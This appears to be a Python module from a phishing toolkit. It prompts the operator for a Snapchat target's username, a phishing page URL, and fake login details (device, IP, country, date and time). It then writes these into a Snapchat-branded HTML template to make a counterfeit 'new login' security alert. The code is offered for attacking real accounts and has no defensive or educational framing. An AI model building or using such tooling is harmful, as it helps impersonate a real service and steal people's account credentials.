from Modules.UI import *

def pageParser():
    clear()
    banner()
    clear()
    banner()
    print(style.YELLOW('--Fill the folowing credentials for Snapchat phishing email--'))
    print(style.GREEN('\n[+]') + style.RESET("Enter the target's Snapchat username:"))
    pageParser.targetUsername  = str(input(style.CYAN(">>> ") + style.RESET('')))
    print(style.GREEN('\n[+]') + style.RESET("Enter you'r phishing page URL:"))
    pageParser.redirectURL = str(input(style.CYAN(">>> ") + style.RESET('')))
    print(style.GREEN('\n[+]') + style.RESET('Enter the device type (EG: Windows, Linux, Iphone, Android...): '))
    pageParser.device = str(input(style.CYAN(">>> ") + style.RESET('')))
    print(r'''
.---------------------.-----------------.-----------.
| [1] 162.243.110.124 |  United States  | New York  |
:---------------------+-----------------+-----------:
| [2] 178.239.173.40  |  Netherlands    | Amsterdam |
:---------------------+-----------------+-----------:
| [3] 27.109.7.244    |  India          | Vadodara  |
:---------------------+-----------------+-----------:
| [4] 80.233.46.215   |  Ireland        | Dublin    |
'---------------------'-----------------'-----------' ''')
    print(style.GREEN('[+]') + style.RESET('Enter the number of the IP from the table or enter your own IP (000.000.000.000)'))
    pageParser.IP = str(input(style.GREEN('>>> ') + style.RESET('')))
    ips = ['162.243.110.124', '178.239.173.40', '27.109.7.244', '80.233.46.215']
    countries = ['America', 'Netherlands', 'India', 'Ireland']
    if int(pageParser.IP.replace('.','')) >= 1 and int(pageParser.IP.replace('.', '')) <= 4:
        ip = int(pageParser.IP) - 1
        pageParser.IP = ips[ip]
        pageParser.loginCountry = countries[ip]
    else:
        pageParser.IP = pageParser.IP
        print(style.GREEN('\n[+]') + style.RESET('Enter the login country: '))
        pageParser.loginCountry = str(input(style.CYAN(">>> ") + style.RESET('')))


    print(style.GREEN('\n[+]') + style.RESET("Date Information"))
    print(style.GREEN('[+]') + style.RESET('Enter the day of te login in numbers:'))
    pageParser.loginDay = str(input(style.CYAN(">>> ") + style.RESET('')))
    print(style.GREEN('\n[+]') + style.RESET('Enter the year of the login:'))
    pageParser.loginYear = str(input(style.CYAN(">>> ") + style.RESET('')))
    print(style.GREEN('\n[+]') + style.RESET('Enter the time of the login (HH:MM):'))
    pageParser.loginTime = str(input(style.CYAN(">>> ") + style.RESET('')))
    print(style.GREEN('\n[+]') + style.RESET('Enter the timezone of the login (GMT/UTC/EST...):'))
    pageParser.timezone = str(input(style.CYAN(">>> ") + style.RESET('')))
    print(r'''
.--------------.---------------.
| [1] January  | [7] July      |
:--------------+---------------:
| [2] February | [8] August    |
:--------------+---------------:
| [3] March    | [9] September |
:--------------+---------------:
| [4] April    | [10] October  |
:--------------+---------------:
| [5] May      | [11] November |
:--------------+---------------:
| [6] June     | [12] December |
'--------------'---------------' ''')
    print(style.GREEN('[+]') + style.RESET('Enter the login month in numbers:'))
    pageParser.loginMonth = str(input(style.GREEN('>>> ') + style.RESET('')))
    months = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December']
    month = int(pageParser.loginMonth) - 1
    pageParser.loginMonth = months[month]



def pageGenerator_SC():
    pageParser()
    fin = open("Templates/Snapchat.html", "rt")
    fout = open("Templates/TempTemplates/SnapchatTemplate.html", "wt")
    for line in fin:
        fout.write(line.replace('#USERNAME', pageParser.targetUsername).replace('#MONTH', pageParser.loginMonth).replace('#DAY', pageParser.loginDay).replace('#YEAR', pageParser.loginYear).replace('#TIME', pageParser.loginTime).replace('#COUNTRY', pageParser.loginCountry).replace('#URL', pageParser.redirectURL).replace('#DEVICE', pageParser.device).replace('#ZONE', pageParser.timezone).replace('#IP', pageParser.IP))
    fin.close()
    fout.close()
